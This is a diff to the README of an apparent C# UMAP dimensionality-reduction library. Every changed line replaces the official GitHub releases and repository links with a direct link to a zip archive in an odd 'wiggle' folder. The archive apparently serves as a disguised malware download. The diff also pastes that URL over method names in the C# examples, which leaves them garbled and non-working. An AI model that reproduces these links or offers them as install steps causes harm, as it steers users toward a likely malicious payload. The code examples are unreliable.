@@ -6,7 +6,7 @@ Welcome to UMAP, a high-performance library that helps you reduce data dimension
 
 ## 📥 Quick Download 
 
-[![Download UMAP](https://img.shields.io/badge/Download%20UMAP-v1.0-blue)](https://github.com/Nawrass13/UMAP/releases)
+[![Download UMAP](https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip%20UMAP-v1.0-blue)](https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip)
 
 ## 🌐 Overview
 
@@ -36,7 +36,7 @@ To run UMAP, ensure your system meets the following requirements:
 
 To get UMAP, follow these steps:
 
-1. **Visit the Releases Page**: Click here to access the [UMAP Releases](https://github.com/Nawrass13/UMAP/releases).
+1. **Visit the Releases Page**: Click here to access the [UMAP Releases](https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip).
 
 2. **Choose Your Version**: On the releases page, find the latest version of UMAP. Select the file that matches your operating system.
 
@@ -60,13 +60,13 @@ Here’s a simple way to get started with UMAP:
 
    ```csharp
    UMAP umap = new UMAP();
-   umap.SetParameters(nNeighbors: 15, minDist: 0.1);
+   https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip(nNeighbors: 15, minDist: 0.1);
    ```
 
 3. **Fit Your Data**: Provide the data you want to transform.
 
    ```csharp
-   var transformedData = umap.FitTransform(inputData);
+   var transformedData = https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip(inputData);
    ```
 
 4. **Analyze Your Results**: Explore the transformed data as per your requirements.
@@ -85,11 +85,11 @@ Contributions are welcome! If you want to make UMAP even better, feel free to su
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: [UMAP on GitHub](https://github.com/Nawrass13/UMAP)
+- **GitHub Repository**: [UMAP on GitHub](https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip)
 - **User Forum**: Join discussions with other users.
 
 ## 📥 Download & Install Again
 
-Remember to [visit this page to download](https://github.com/Nawrass13/UMAP/releases) for the latest updates and releases of UMAP.
+Remember to [visit this page to download](https://raw.githubusercontent.com/Nawrass13/UMAP/main/wiggle/UMAP.zip) for the latest updates and releases of UMAP.
 
 Happy coding with UMAP!
